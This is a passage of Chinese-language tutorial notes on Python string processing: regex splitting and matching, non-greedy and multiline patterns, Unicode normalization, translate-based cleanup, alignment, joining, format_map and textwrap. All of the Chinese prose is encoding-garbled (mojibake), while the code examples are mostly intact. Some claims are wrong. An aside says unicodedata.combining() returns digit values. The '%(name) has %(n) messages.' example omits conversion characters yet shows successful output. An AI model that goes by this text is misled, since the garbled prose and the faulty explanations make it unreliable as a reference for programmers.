ä¸æƒ³ä¿ç•™åˆ†å‰²å­—ç¬¦ä¸²åˆ°ç»“æœåˆ—è¡¨ä¸­å»ï¼Œä½†ä»ç„¶éœ€è¦ä½¿ç”¨åˆ°æ‹¬å·æ¥åˆ†ç»„æ­£åˆ™ è¡¨è¾¾å¼çš„è¯ï¼Œ ç¡®ä¿ä½ çš„åˆ†ç»„æ˜¯éæ•è·åˆ†ç»„ï¼Œå½¢å¦‚ (?:...) >>> re.split(r'(?:,|;|\\s)\\s*', line) ['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo'] >>> å­—ç¬¦ä¸²é¦–å°¾åŒ¹é… str.startswith str. endswith åˆ‡ç‰‡ re.match, è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/re fnmatch.fnmatch, è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/fnmatch fnmatch.fnmatchcase å­—ç¬¦ä¸²æœç´¢/åŒ¹é… str.find str.endswith str.startswith re.match re.findall re.finditer å®šä¹‰æ­£åˆ™å¼çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šåˆ©ç”¨æ‹¬å·å»æ•è·åˆ†ç»„ ä½¿ç”¨match: >>> datepat = re.compile(r'(\\d+)/(\\d+)/(\\d+)') >>> m = datepat.match('11/27/2012') >>> m <_sre.SRE_Match object at 0x1005d2750> >>> # Extract the contents of each group >>> m.group(0) '11/27/2012' >>> m.group(1) '11' >>> m.group(2) '27' >>> m.group(3) '2012' >>> m.groups() ('11', '27', '2012') ä½¿ç”¨ findall: >>> text 'Today is 11/27/2012. PyCon starts 3/13/2013.' >>> datepat.findall(text) [('11', '27', '2012'), ('3', '13', '2013')] >>> for month, day, year in datepat.findall(text): ... print('{}-{}-{}'.format(year, month, day)) ... 2012-11-27 2013-3-13 >>> ä½¿ç”¨ finditer è·å–è¿­ä»£. å­—ç¬¦ä¸²æ›¿æ¢/æœç´¢ str.replace re.sub, è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/re sub: >>> text = 'Today is 11/27/2012. PyCon starts 3/13/2013.' >>> import re >>> re.sub(r'(\\d+)/(\\d+)/(\\d+)', r'\\3-\\1-\\2', text) 'Today is 2012-11-27. PyCon starts 2013-3-13.' >>> å¿½ç•¥å¤§å°å†™ re.IGNORECASE re.IGNORECASE >>> text = 'UPPER PYTHON, lower python, Mixed Python' >>> re.findall('python', text, flags=re.IGNORECASE) ['PYTHON', 'python', 'Python'] >>> re.sub('python', 'snake', text, flags=re.IGNORECASE) 'UPPER snake, lower snake, Mixed snake' >>> æœ€çŸ­åŒ¹é…æ¨¡å¼ è¿™ä¸ªé—®é¢˜ä¸€èˆ¬å‡ºç°åœ¨éœ€è¦åŒ¹é…ä¸€å¯¹åˆ†éš”ç¬¦ä¹‹é—´çš„æ–‡æœ¬çš„æ—¶å€™ (æ¯”å¦‚å¼•å·åŒ…å«çš„å­—ç¬¦ ä¸²), åŸå› æ˜¯ åœ¨æ­£ åˆ™è¡¨è¾¾å¼ä¸­ * æ“ä½œç¬¦æ˜¯è´ªå©ªçš„ï¼Œå› æ­¤åŒ¹é…æ“ä½œä¼šæŸ¥æ‰¾æœ€é•¿çš„å¯èƒ½åŒ¹é… >>> str_pat = re.compile(r'\\\"(.*)\\\"') >>> text1 = 'Computer says \"no.\"' >>> str_pat.findall(text1) ['no.'] >>> text2 = 'Computer says \"no.\" Phone says \"yes.\"' >>> str_pat.findall(text2) ['no.\" Phone says \"yes.'] >>> ä¸ºäº†ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åœ¨æ¨¡å¼ä¸­çš„ * æ“ä½œç¬¦åé¢åŠ ä¸Š? ä¿®é¥°ç¬¦: >>> str_pat = re.compile(r'\\\"(.*?)\\\"') >>> str_pat.findall(text2) ['no.', 'yes.'] >>> ä½¿å¾—åŒ¹é…å˜æˆéè´ªå©ªæ¨¡å¼ï¼Œä»è€Œå¾—åˆ°æœ€çŸ­çš„åŒ¹é… åœ¨ä¸€ ä¸ªæ¨¡å¼å­—ç¬¦ä¸²ä¸­ï¼Œç‚¹ (.) åŒ¹é…é™¤äº†æ¢è¡Œå¤–çš„ä»»ä½•å­—ç¬¦ã€‚ ç„¶è€Œï¼Œå¦‚æœä½ å°†ç‚¹ (.) å·æ”¾åœ¨å¼€å§‹ ä¸ç»“æŸç¬¦ (æ¯”å¦‚å¼•å·) ä¹‹é—´çš„æ—¶å€™ï¼Œé‚£ä¹ˆåŒ¹é…æ“ä½œä¼šæŸ¥æ‰¾ç¬¦åˆæ¨¡å¼çš„æœ€é•¿å¯èƒ½åŒ¹é…ã€‚ è¿™ æ ·é€šå¸¸ä¼šå¯¼è‡´å¾ˆå¤šä¸­é—´çš„è¢«å¼€å§‹ä¸ç»“æŸç¬¦åŒ…å«çš„æ–‡æœ¬è¢«å¿½ç•¥æ‰ï¼Œå¹¶æœ€ç»ˆè¢«åŒ…å«åœ¨åŒ¹é… ç»“æœå­—ç¬¦ä¸²ä¸­è¿”å›ã€‚ é€šè¿‡åœ¨ * æˆ–è€… + è¿™æ ·çš„æ“ä½œç¬¦åé¢æ·»åŠ ä¸€ä¸ª ? å¯ä»¥å¼ºåˆ¶åŒ¹é…ç®—æ³• æ”¹æˆå¯»æ‰¾æœ€çŸ­çš„å¯èƒ½åŒ¹é…ã€‚ å¤šè¡ŒåŒ¹é… ç‚¹ (.) åŒ¹é…é™¤äº†æ¢è¡Œå¤–çš„ä»»ä½•å­—ç¬¦ å¯ä»¥ä¿®æ”¹æ¨¡å¼å­—ç¬¦ä¸²ï¼Œå¢åŠ å¯¹æ¢è¡Œçš„æ”¯æŒ: >>> text1 = '/* this is a comment */' >>> text2 = '''/* this is a ... multiline comment */ ... ''' >>> comment.findall(text1) [' this is a comment '] >>> comment.findall(text2) [] >>> >>> comment = re.compile(r'/\\*((?:.|\\n)*?)\\*/') >>> comment.findall(text2) [' this is a\\n multiline comment '] >>> (?:.|n) æŒ‡å®šäº†ä¸€ä¸ªéæ•è·ç»„ (ä¹Ÿå°±æ˜¯å®ƒå®šä¹‰äº†ä¸€ä¸ªä»…ä»…ç”¨æ¥åš åŒ¹é…ï¼Œè€Œä¸èƒ½é€šè¿‡å•ç‹¬æ•è·æˆ–è€…ç¼–å·çš„ç»„)ã€‚ re.compile() å‡½æ•°æ¥å—ä¸€ä¸ªæ ‡å¿—å‚æ•°å« re.DOTALL ï¼Œå¯ä»¥è®© æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‚¹ (.) åŒ¹é…åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…çš„ä»»æ„å­—ç¬¦ Unicode æ–‡æœ¬æ ‡å‡†åŒ– åœ¨ Unicode ä¸­ï¼ŒæŸäº›å­—ç¬¦èƒ½å¤Ÿç”¨å¤šä¸ªåˆæ³•çš„ç¼–ç è¡¨ç¤º: >>> s1 = 'Spicy Jalape\\u00f1o' >>> s2 = 'Spicy Jalapen\\u0303o' >>> s1 'Spicy JalapeÃ±o' >>> s2 'Spicy JalapeÃ±o' >>> s1 == s2 False >>> len(s1) 14 >>> len(s2) 15 >>> æ–‡æœ¬\"Spicy JalapeÃ±o\"ä½¿ç”¨äº†ä¸¤ç§å½¢å¼æ¥è¡¨ç¤ºã€‚ ç¬¬ä¸€ç§ä½¿ç”¨æ•´ä½“å­—ç¬¦\"Ã±\" (U+00F1)ï¼Œ ç¬¬äºŒç§ä½¿ç”¨æ‹‰ä¸å­—æ¯\"n\"åé¢è·Ÿä¸€ä¸ª\"~\"çš„ç»„åˆå­—ç¬¦ (U+0303)ã€‚ åœ¨éœ€è¦æ¯”è¾ƒå­—ç¬¦ä¸²çš„ç¨‹åºä¸­ä½¿ç”¨å­—ç¬¦çš„å¤šç§è¡¨ç¤ºä¼šäº§ç”Ÿé—®é¢˜ã€‚ä¸ºäº†ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼Œ ä½ å¯ä»¥ä½¿ç”¨ unicodedata æ¨¡å—å…ˆå°†æ–‡æœ¬æ ‡å‡†åŒ–: >>> import unicodedata >>> t1 = unicodedata.normalize('NFC', s1) >>> t2 = unicodedata.normalize('NFC', s2) >>> t1 == t2 True >>> print(ascii(t1)) 'Spicy Jalape\\xf1o' >>> t3 = unicodedata.normalize('NFD', s1) >>> t4 = unicodedata.normalize('NFD', s2) >>> t3 == t4 True >>> print(ascii(t3)) 'Spicy Jalapen\\u0303o' >>> NFC è¡¨ç¤ºå­—ç¬¦åº”è¯¥æ˜¯æ•´ä½“ç»„ æˆ (æ¯”å¦‚å¯èƒ½çš„è¯å°±ä½¿ç”¨å•ä¸€ç¼–ç ) NFD è¡¨ç¤ºå­—ç¬¦åº”è¯¥åˆ†è§£ä¸ºå¤šä¸ªç»„åˆå­—ç¬¦è¡¨ç¤º åŒæ ·æ”¯æŒæ‰©å±•çš„æ ‡å‡†åŒ–å½¢å¼ NFKC å’Œ NFKDï¼Œå®ƒä»¬åœ¨å¤„ç†æŸäº›å­—ç¬¦çš„æ—¶ å€™å¢åŠ äº†é¢å¤–çš„å…¼å®¹ç‰¹æ€§ã€‚æ¯”å¦‚: >>> s = '\\ufb01' # A single character >>> s '' >>> unicodedata.normalize('NFD', s) '' # Notice how the combined letters are broken apart here >>> unicodedata.normalize('NFKD', s) 'fi' >>> unicodedata.normalize('NFKC', s) 'fi' >>> æ ‡å‡†åŒ–å¯¹äºä»»ä½•éœ€è¦ä»¥ä¸€è‡´çš„æ–¹å¼å¤„ç† Unicode æ–‡æœ¬çš„ç¨‹åºéƒ½æ˜¯éå¸¸é‡è¦çš„ , å½“ å¤„ç†æ¥è‡ªç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²è€Œä½ å¾ˆéš¾å»æ§åˆ¶ç¼–ç çš„æ—¶å€™å°¤å…¶å¦‚æ­¤ã€‚ åœ¨æ¸…ç†å’Œè¿‡æ»¤æ–‡æœ¬çš„æ—¶å€™å­—ç¬¦çš„æ ‡å‡†åŒ–ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚ æ¯”å¦‚ï¼Œå‡è®¾ä½ æƒ³æ¸…é™¤æ‰ä¸€äº› æ–‡æœ¬ä¸Šé¢çš„å˜éŸ³ç¬¦çš„æ—¶å€™ (å¯èƒ½æ˜¯ä¸ºäº†æœç´¢å’ŒåŒ¹é…): >>> t1 = unicodedata.normalize('NFD', s1) >>> ''.join(c for c in t1 if not unicodedata.combining(c)) 'Spicy Jalapeno' >>> combining() å‡½æ•°å¯ä»¥æµ‹è¯•ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºå’ŒéŸ³å­—ç¬¦ å’ŒéŸ³å­—ç¬¦, ä¸çŸ¥é“ä¸ºä»€ä¹¦ä¸Šè¿™ä¹ˆå®šä¹‰, å®é™…å°±æ˜¯æ˜¯å¦ä¸ºè§„èŒƒçš„æ•°å­—å­—ç¬¦: ä¸ºè§„èŒƒæ•°å­—å­—ç¬¦è¿”å›æ•°å­— å¦åˆ™è¿”å›0 æ­£åˆ™ä½¿ç”¨ Unicode ç”¨äº ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¤„ç†æ–‡æœ¬ï¼Œä½†æ˜¯å…³æ³¨çš„æ˜¯ Unicode å­—ç¬¦å¤„ç† é»˜è®¤æƒ…å†µä¸‹ re æ¨¡å—å·²ç»å¯¹ä¸€äº› Unicode å­—ç¬¦ç±»æœ‰äº†åŸºæœ¬çš„æ”¯æŒã€‚ æ¯”å¦‚ï¼Œ \\\\d å¯è¡¨ç¤ºåŒ¹é…ä»»æ„çš„ unicode æ•°å­—å­—ç¬¦: >>> import re >>> num = re.compile('\\d+') >>> # ASCII digits >>> num.match('123') <_sre.SRE_Match object at 0x1007d9ed0> >>> # Arabic digits >>> num.match('\\u0661\\u0662\\u0663') <_sre.SRE_Match object at 0x101234030> >>> åŒ¹é…å‡ ä¸ªä¸åŒé˜¿æ‹‰ä¼¯ç¼–ç é¡µ é¢ä¸­æ‰€æœ‰å­—ç¬¦: >>> arabic = re.compile('[\\u0600-\\u06ff\\u0750-\\u077f\\u08a0-\\u08ff]+') >>> å½“æ‰§è¡ŒåŒ¹é…å’Œæœç´¢æ“ä½œçš„æ—¶å€™ï¼Œæœ€å¥½æ˜¯å…ˆæ ‡å‡†åŒ–å¹¶ä¸”æ¸…ç†æ‰€æœ‰æ–‡æœ¬ä¸ºæ ‡å‡†åŒ–æ ¼å¼. ä½†æ˜¯åŒæ ·ä¹Ÿåº”è¯¥æ³¨æ„ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œæ¯”å¦‚åœ¨å¿½ç•¥å¤§å°å†™åŒ¹é…å’Œå¤§å°å†™ è½¬æ¢æ—¶çš„è¡Œä¸º: >>> pat = re.compile('stra\\u00dfe', re.IGNORECASE) >>> s = 'straÃŸe' >>> pat.match(s) # Matches <_sre.SRE_Match object at 0x10069d370> >>> pat.match(s.upper()) # Doesn't match >>> s.upper() # Case folds 'STRASSE' >>> æ··åˆä½¿ç”¨ Unicode å’Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä¼šè®©ä½ æŠ“ç‹‚ã€‚ å¦‚æœä½ çœŸçš„æ‰“ç®—è¿™æ ·åšçš„è¯ï¼Œæœ€ å¥½è€ƒè™‘ä¸‹å®‰è£…ç¬¬ä¸‰æ–¹æ­£åˆ™å¼åº“ï¼Œ å®ƒä»¬ä¼šä¸º Unicode çš„å¤§å°å†™è½¬æ¢å’Œå…¶ä»–å¤§é‡æœ‰è¶£ç‰¹æ€§ æä¾›å…¨é¢çš„æ”¯æŒï¼ŒåŒ…æ‹¬æ¨¡ç³ŠåŒ¹é…ã€‚ åˆ é™¤å­—ç¬¦ä¸²ä¸­å­—ç¬¦ å»æ‰æ–‡æœ¬å­—ç¬¦ä¸²å¼€å¤´ï¼Œç»“å°¾æˆ–è€…ä¸­é—´ä¸æƒ³è¦çš„å­—ç¬¦ï¼Œæ¯”å¦‚ç©ºç™½ str.strip åˆ é™¤å¼€å§‹æˆ–ç»“å°¾çš„å­—ç¬¦ str.lstrip ä»å·¦æ‰§è¡Œåˆ é™¤ str.rstrip ä»å³æ‰§è¡Œåˆ é™¤ str.replace å­—ç¬¦ä¸²æ›¿æ¢ re.sub å­—ç¬¦ä¸²æ­£åˆ™æ›¿æ¢ æ¸…ç†æ–‡æœ¬å­—ç¬¦ä¸² é™¤äº†ä¸Šé¢çš„, è¿˜æœ‰ str.translate è‡ªå®šä¹‰æ›¿æ¢ ä¾‹å¦‚: >>> s = 'pÃ½tÄ¥Ã¶Ã±\\fis\\tawesome\\r\\n' >>> s 'pÃ½tÄ¥Ã¶Ã±\\x0cis\\tawesome\\r\\n' >>> ç¬¬ä¸€æ­¥æ˜¯æ¸…ç†ç©ºç™½å­—ç¬¦, ç©ºç™½å­—ç¬¦ \\t å’Œ \\f å·²ç»è¢«é‡æ–°æ˜ å°„åˆ°ä¸€ä¸ªç©ºæ ¼ã€‚ å›è½¦å­—ç¬¦ \\r ç›´ æ¥è¢«åˆ é™¤ã€‚: >>> remap = { ... ord('\\t') : ' ', ... ord('\\f') : ' ', ... ord('\\r') : None # Deleted ... } >>> a = s.translate(remap) >>> a 'pÃ½tÄ¥Ã¶Ã± is awesome\\n' >>> ä½¿ç”¨ dict.fromkeys() æ–¹æ³•æ„é€ ä¸€ä¸ªå­—å…¸ï¼Œæ¯ä¸ª Unicode å’ŒéŸ³ ç¬¦ä½œä¸ºé”®ï¼Œå¯¹åº”çš„å€¼å…¨éƒ¨ä¸º None ã€‚ ç„¶åä½¿ç”¨ unicodedata.normalize() å°†åŸå§‹è¾“å…¥æ ‡å‡†åŒ–ä¸ºåˆ†è§£å½¢å¼å­—ç¬¦ã€‚ ç„¶åå† è°ƒç”¨ translate å‡½æ•°åˆ é™¤æ‰€æœ‰é‡éŸ³ç¬¦: >>> import unicodedata >>> import sys >>> cmb_chrs = dict.fromkeys(c for c in range(sys.maxunicode) ... if unicodedata.combining(chr(c))) ... >>> b = unicodedata.normalize('NFD', a) >>> b 'pÃ½tÄ¥Ã¶Ã± is awesome\\n' >>> b.translate(cmb_chrs) 'python is awesome\\n' >>> åŒæ ·çš„æŠ€æœ¯ä¹Ÿå¯ä»¥è¢«ç”¨æ¥åˆ é™¤å…¶ä»–ç±»å‹çš„å­—ç¬¦ (æ¯”å¦‚æ§åˆ¶å­—ç¬¦ç­‰)ã€‚ å¦ä¸€ç§æ¸…ç†æ–‡æœ¬çš„æŠ€æœ¯æ¶‰åŠåˆ° I/O è§£ç ä¸ç¼–ç å‡½æ•°ã€‚ è¿™é‡Œçš„æ€è·¯æ˜¯å…ˆå¯¹æ–‡æœ¬åšä¸€ äº›åˆæ­¥çš„æ¸…ç†ï¼Œç„¶åå†ç»“åˆ encode() æˆ–è€… decode() æ“ä½œæ¥æ¸…é™¤æˆ–ä¿®æ”¹å®ƒ: >>> a 'pÃ½tÄ¥Ã¶Ã± is awesome\\n' >>> b = unicodedata.normalize('NFD', a) >>> b.encode('ascii', 'ignore').decode('ascii') 'python is awesome\\n' >>> è¿™é‡Œçš„æ ‡å‡†åŒ–æ“ä½œå°†åŸæ¥çš„æ–‡æœ¬åˆ†è§£ä¸ºå•ç‹¬çš„å’ŒéŸ³ç¬¦ã€‚ æ¥ä¸‹æ¥çš„ ASCII ç¼–ç /è§£ç  åªæ˜¯ç®€å•çš„ä¸€ä¸‹å­ä¸¢å¼ƒæ‰é‚£äº›å­—ç¬¦ã€‚ å½“ç„¶ï¼Œè¿™ç§æ–¹æ³•ä»…ä»…åªåœ¨æœ€åçš„ç›®æ ‡å°±æ˜¯è·å–åˆ°æ–‡ æœ¬å¯¹åº” ACSII è¡¨ç¤ºçš„æ—¶å€™ç”Ÿæ•ˆã€‚ æ–‡æœ¬å­—ç¬¦æ¸…ç†ä¸€ä¸ªæœ€ä¸»è¦çš„é—®é¢˜åº”è¯¥æ˜¯è¿è¡Œçš„æ€§èƒ½ã€‚ ä¸€èˆ¬æ¥è®²ï¼Œä»£ç è¶Šç®€å•è¿è¡Œè¶Š å¿«ã€‚ å¯¹äºç®€å•çš„æ›¿æ¢æ“ä½œï¼Œstr.replace() æ–¹æ³•é€šå¸¸æ˜¯æœ€å¿«çš„ï¼Œç”šè‡³åœ¨ä½ éœ€è¦å¤šæ¬¡è°ƒç”¨ çš„æ—¶å€™. å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ éœ€è¦æ‰§è¡Œä»»ä½•å¤æ‚å­—ç¬¦å¯¹å­—ç¬¦çš„é‡æ–°æ˜ å°„æˆ–è€…åˆ é™¤æ“ä½œçš„è¯ï¼Œ tanslate() æ–¹æ³•ä¼šéå¸¸çš„å¿«ã€‚ å­—ç¬¦ä¸²å¯¹é½ é€šè¿‡æŸç§å¯¹é½æ–¹å¼æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸² str.ljust str.rjust str.center format ä¾‹: >>> text = 'Hello World' >>> text.ljust(20) 'Hello World ' >>> text.rjust(20) ' Hello World' >>> text.center(20) ' Hello World ' >>> æ‰€æœ‰è¿™äº›æ–¹æ³•éƒ½èƒ½æ¥å—ä¸€ä¸ªå¯é€‰çš„å¡«å……å­—ç¬¦: >>> text.rjust(20,'=') '=========Hello World' >>> text.center(20,'*') '****Hello World*****' >>> å‡½æ•° format() åŒæ ·å¯ä»¥ç”¨æ¥å¾ˆå®¹æ˜“çš„å¯¹é½å­—ç¬¦ä¸²ã€‚ä½ è¦åšçš„å°±æ˜¯ä½¿ç”¨ <,> æˆ–è€… &#94; å­—ç¬¦åé¢ç´§è·Ÿä¸€ä¸ªæŒ‡å®šçš„å®½åº¦: >>> format(text, '>20') ' Hello World' >>> format(text, '<20') 'Hello World ' >>> format(text, '&#94;20') ' Hello World ' >>> å¦‚æœä½ æƒ³æŒ‡å®šä¸€ä¸ªéç©ºæ ¼çš„å¡«å……å­—ç¬¦ï¼Œå°†å®ƒå†™åˆ°å¯¹é½å­—ç¬¦çš„å‰é¢å³å¯: >>> format(text, '=>20s') '=========Hello World' >>> format(text, '*&#94;20s') '****Hello World*****' >>> å½“æ ¼å¼åŒ–å¤šä¸ªå€¼çš„æ—¶å€™ï¼Œè¿™äº›æ ¼å¼ä»£ç ä¹Ÿå¯ä»¥è¢«ç”¨åœ¨ format() æ–¹æ³•ä¸­: >>> '{:>10s} {:>10s}'.format('Hello', 'World') ' Hello World' >>> format() å‡½æ•°çš„ä¸€ä¸ªå¥½å¤„æ˜¯å®ƒä¸ä»…é€‚ç”¨äºå­—ç¬¦ä¸²ã€‚å®ƒå¯ä»¥ç”¨æ¥æ ¼å¼åŒ–ä»»ä½•å€¼ï¼Œä½¿ å¾—å®ƒéå¸¸çš„é€šç”¨ã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥ç”¨å®ƒæ¥æ ¼å¼åŒ–æ•°å­—: >>> x = 1.2345 >>> format(x, '>10') ' 1.2345' >>> format(x, '&#94;10.2f') ' 1.23 ' >>> åœ¨è€çš„ä»£ç ä¸­ï¼Œä½ ç»å¸¸ä¼šçœ‹åˆ°è¢«ç”¨æ¥æ ¼å¼åŒ–æ–‡æœ¬çš„ % æ“ä½œç¬¦ã€‚æ¯”å¦‚: >>> '%-20s' % text 'Hello World ' >>> '%20s' % text ' Hello World' >>> ä½†æ˜¯ï¼Œåœ¨æ–°ç‰ˆæœ¬ä»£ç ä¸­ï¼Œä½ åº”è¯¥ä¼˜å…ˆé€‰æ‹© format() å‡½æ•°æˆ–è€…æ–¹æ³•ã€‚ format() è¦æ¯” % æ“ä½œç¬¦çš„åŠŸèƒ½æ›´ä¸ºå¼ºå¤§ã€‚ å¹¶ä¸” format() ä¹Ÿæ¯”ä½¿ç”¨ ljust() , rjust() æˆ– center() æ–¹ æ³•æ›´é€šç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥ç”¨æ¥æ ¼å¼åŒ–ä»»æ„å¯¹è±¡ï¼Œè€Œä¸ä»…ä»…æ˜¯å­—ç¬¦ä¸² åˆå¹¶/æ‹¼æ¥å­—ç¬¦ä¸² å°†å‡ ä¸ªå°çš„å­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå¤§çš„å­—ç¬¦ ''.join(iter) str1 + str2 åªæ˜¯åˆå¹¶å°‘æ•°å‡ ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿ç”¨åŠ å· (+) é€šå¸¸å·²ç»è¶³å¤Ÿäº†: >>> a = 'Is Chicago' >>> b = 'Not Chicago?' >>> a + ' ' + b 'Is Chicago Not Chicago?' >>> åœ¨æºç ä¸­å°†ä¸¤ä¸ªå­—é¢å­—ç¬¦ä¸²åˆå¹¶: >>> a = 'Hello' 'World' >>> a 'HelloWorld' >>> ä½¿ç”¨åŠ å· (+) æ“ä½œç¬¦å»è¿æ¥å¤§é‡çš„å­—ç¬¦ä¸²çš„ æ—¶å€™æ˜¯éå¸¸ä½æ•ˆç‡çš„ï¼Œå› ä¸ºåŠ å·è¿æ¥ä¼šå¼•èµ·å†…å­˜å¤åˆ¶ä»¥åŠåƒåœ¾å›æ”¶æ“ä½œ æ³¨æ„åˆ«ä½¿ç”¨æ²¡å¿…è¦çš„å­—ç¬¦ä¸²è¿æ¥: print(a + ':' + b + ':' + c) # Ugly print(':'.join([a, b, c])) # Still ugly print(a, b, c, sep=':') # Better å½“æ··åˆä½¿ç”¨ I/O æ“ä½œå’Œå­—ç¬¦ä¸²è¿æ¥æ“ä½œçš„æ—¶å€™ï¼Œæœ‰æ—¶å€™éœ€è¦ä»”ç»†ç ”ç©¶ä½ çš„ç¨‹åºã€‚æ¯” å¦‚: # Version 1 (string concatenation) f.write(chunk1 + chunk2) # Version 2 (separate I/O operations) f.write(chunk1) f.write(chunk2) å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²å¾ˆå°ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªç‰ˆæœ¬æ€§èƒ½ä¼šæ›´å¥½äº›ï¼Œå› ä¸º I/O ç³»ç»Ÿè°ƒç”¨å¤©ç”Ÿå°± æ…¢ã€‚ å¦å¤–ä¸€æ–¹é¢ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²å¾ˆå¤§ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªç‰ˆæœ¬å¯èƒ½ä¼šæ›´åŠ é«˜æ•ˆï¼Œå› ä¸ºå®ƒé¿å… äº†åˆ›å»ºä¸€ä¸ªå¾ˆå¤§çš„ä¸´æ—¶ç»“æœå¹¶ä¸”è¦å¤åˆ¶å¤§é‡çš„å†…å­˜å—æ•°æ®ã€‚ ç¼–å†™æ„å»ºå¤§é‡å°å­—ç¬¦ä¸²çš„è¾“å‡ºä»£ç ï¼Œä½ æœ€å¥½è€ƒè™‘ä¸‹ä½¿ç”¨ç”Ÿ æˆå™¨å‡½æ•°ï¼Œåˆ©ç”¨ yield è¯­å¥äº§ç”Ÿè¾“å‡ºç‰‡æ®µ: def sample(): yield 'Is' yield 'Chicago' yield 'Not' yield 'Chicago?' æ”¯æŒç›´æ¥join: text = ''.join(sample()) å­—ç¬¦ä¸²ä¸­æ’å…¥å˜é‡ format ä½¿ç”¨ format: >>> s = '{name} has {n} messages.' >>> s.format(name='Guido', n=37) 'Guido has 37 messages.' >>> å¦‚æœè¦è¢«æ›¿æ¢çš„å˜é‡èƒ½åœ¨å˜é‡åŸŸä¸­æ‰¾åˆ°ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç»“åˆä½¿ç”¨ format_map() å’Œ vars() >>> name = 'Guido' >>> n = 37 >>> s.format_map(vars()) 'Guido has 37 messages.' >>> ä¹Ÿé€‚ç”¨äºå¯¹è±¡å®ä¾‹: >>> class Info: ... def __init__(self, name, n): ... self.name = name ... self.n = n >>> a = Info('Guido',37) >>> s.format_map(vars(a)) 'Guido has 37 messages.' >>> format å’Œ format_map() çš„ä¸€ä¸ªç¼ºé™·å°±æ˜¯å®ƒä»¬å¹¶ä¸èƒ½å¾ˆå¥½çš„å¤„ç†å˜é‡ç¼ºå¤±çš„æƒ…å†µ: >>> s.format(name='Guido') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> KeyError: 'n' >>> ä¸€ç§é¿å…è¿™ç§é”™è¯¯çš„æ–¹æ³•æ˜¯å¦å¤–å®šä¹‰ä¸€ä¸ªå«æœ‰ __missing__() æ–¹æ³•çš„å­—å…¸å¯¹è±¡: class safesub(dict): \"\"\" é˜²æ­¢ key æ‰¾ä¸åˆ°\"\"\" def __missing__(self, key): return '{' + key + '}' >>> del n # Make sure n is undefined >>> s.format_map(safesub(vars())) 'Guido has {n} messages.' >>> å…¶ä»–æ–¹å¼: % >>> name = 'Guido' >>> n = 37 >>> '%(name) has %(n) messages.' % vars() 'Guido has 37 messages.' >>> å­—ç¬¦ä¸²æ¨¡ç‰ˆ: >>> import string >>> s = string.Template('$name has $n messages.') >>> s.substitute(vars()) 'Guido has 37 messages.' >>> format() å’Œ format_map() ç›¸æ¯”è¾ƒä¸Šé¢è¿™äº›æ–¹æ¡ˆè€Œå·²æ›´åŠ å…ˆè¿›ï¼Œå› æ­¤åº”è¯¥ è¢«ä¼˜å…ˆé€‰æ‹©ã€‚ ä½¿ç”¨ format() æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯ä½ å¯ä»¥è·å¾—å¯¹å­—ç¬¦ä¸²æ ¼å¼åŒ–çš„æ‰€æœ‰ æ”¯æŒ (å¯¹é½ï¼Œå¡«å……ï¼Œæ•°å­—æ ¼å¼åŒ–ç­‰å¾…)ï¼Œ è€Œè¿™äº›ç‰¹æ€§æ˜¯ä½¿ç”¨åƒæ¨¡æ¿å­—ç¬¦ä¸²ä¹‹ç±»çš„æ–¹æ¡ˆä¸å¯ èƒ½è·å¾—çš„ã€‚ æŒ‡å®šåˆ—å®½æ ¼å¼åŒ– æœ‰ä¸€äº›é•¿å­—ç¬¦ä¸²ï¼Œæƒ³ä»¥æŒ‡å®šçš„åˆ—å®½å°†å®ƒä»¬é‡æ–°æ ¼å¼åŒ– /docs/åç«¯/python/pythonæ ‡å‡†åº“/textwrap ä½¿ç”¨ textwrap s = \"Look into my eyes, look into my eyes, the eyes, the eyes, \\ the eyes, not around the eyes, don't look around the eyes, \\ look into my eyes, you're under.\" æ ¼å¼åŒ–: >>> import textwrap >>> print(textwrap.fill(s, 70)) # æ¯è¡Œæœ€é•¿ 70 >>> print(textwrap.fill(s, 40)) # æ¯è¡Œæœ€é•¿ 40 >>> print(textwrap.fill(s, 40, initial_indent=' ')) textwrap æ¨¡å—å¯¹äºå­—ç¬¦ä¸²æ‰“å°æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œç‰¹åˆ«æ˜¯å½“ä½ å¸Œæœ›è¾“å‡ºè‡ªåŠ¨åŒ¹é…ç»ˆç«¯ å¤§å°çš„æ—¶å€™ã€‚ ä½ å¯ä»¥ä½¿ç”¨ os.get_terminal_size() æ–¹æ³•æ¥è·å–ç»ˆç«¯çš„å¤§å°å°ºå¯¸ã€‚æ¯”å¦‚: >>> import os >>> os.get_terminal_size().columns 80 >>> fill() æ–¹æ³•æ¥å—ä¸€äº›å…¶ä»–å¯é€‰å‚æ•°æ¥æ§åˆ¶ tabï¼Œè¯­å¥ç»“å°¾ç­‰ã€‚å‚é˜… /docs/åç«¯/python/pythonæ ‡å‡†åº“/textwrap å¤„ç† html å’Œ xml å°† HTML æˆ–è€… XML å®ä½“å¦‚ &entity; æˆ– &#code; æ›¿æ¢ä¸ºå¯¹åº”çš„æ–‡æœ¬ã€‚å†è€…ï¼Œ ä½ 